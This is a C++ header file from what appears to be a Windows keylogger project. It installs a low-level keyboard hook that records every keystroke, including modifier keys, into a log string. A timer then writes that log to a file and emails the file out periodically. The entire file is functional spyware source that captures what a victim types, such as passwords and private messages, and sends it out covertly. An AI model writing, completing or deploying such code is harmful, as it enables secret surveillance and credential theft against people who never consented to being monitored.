#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include<iostream>
#include<fstream>
#include "windows.h"
#include "keyconstant.h"
#include "timer.h"
#include "sendmail.h"

std::string keylog="" ;

void TimerSendMail()
{
    if(keylog.empty())
    {
        return ;
    }

std:: string last_file=IO::WriteLog(keylog) ;

   if(last_file.empty())
    {
     Helper::WriteAppLog("File creation was not succesful . keylog '" + keylog + "'") ;
     return ;
    }
//for debugging purpose
   int x=MAIL::SendMail("Log [" + last_file + "]" ,
                     "Hi :) \n The file has been attached to thid mail :)\nFor testing :\n" + keylog
                     , IO::GetOurPath(true) + last_file) ;


  if(x!=7)
  Helper::WriteAppLog("Mail was not sent Error code : " + Helper::ToString(x)) ;

  else
    keylog="" ;

}

Timer MailTimer(TimerSendMail , 250*60 , Timer::infinite) ;

HHOOK eHook =NULL ; //global variable
LRESULT OurKeyboardProc (int ncode  , WPARAM wparam , LPARAM lparam )
{
    if(ncode<0 )
        CallNextHookEx(eHook ,ncode ,wparam, lparam ) ;
    KBDLLHOOKSTRUCT *kbs=(KBDLLHOOKSTRUCT *)lparam ;

    if(wparam==WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog+=keys::KEYS[(kbs->vkCode)].Name ;

        if(kbs->vkCode==VK_RETURN)
        keylog+='\n' ;

    }
    else if(wparam==WM_KEYUP || wparam==WM_SYSKEYUP)
    {
        //[SHIFT][a][b][c][/SHIFT]
        DWORD key=kbs->vkCode ;
        if(key==VK_CONTROL
              || key==VK_LCONTROL
              ||key==VK_RCONTROL
              ||key==VK_LSHIFT
              ||key==VK_MENU
              ||key== VK_LMENU
              ||key == VK_RMENU
              ||key== VK_CAPITAL
              ||key==VK_NUMLOCK
              || key== VK_LWIN
              || key == VK_RWIN
         )
        {

             std :: string Keyname=keys::KEYS[kbs->vkCode].Name ;
             Keyname.insert(1 ,"/") ;
             keylog+=Keyname  ;
        }

    }

    return CallNextHookEx(eHook, ncode , wparam ,lparam) ;


}
bool InstallHook()
{
    Helper:: WriteAppLog("Hook Started .... Timer started ") ;
    MailTimer.start(true) ;


    eHook =SetWindowsHookEx(WH_KEYBOARD_LL , (HOOKPROC)OurKeyboardProc,
                            GetModuleHandle(NULL) , 0) ;

     return eHook==NULL ;

}
bool UnistallHook()
{
  bool b=UnhookWindowsHookEx(eHook) ;
  eHook=NULL ;
  return (bool)  b  ;
}
bool IsHooked()
{
    return (bool)(eHook) ;
}


#endif // KEYBHOOK_H
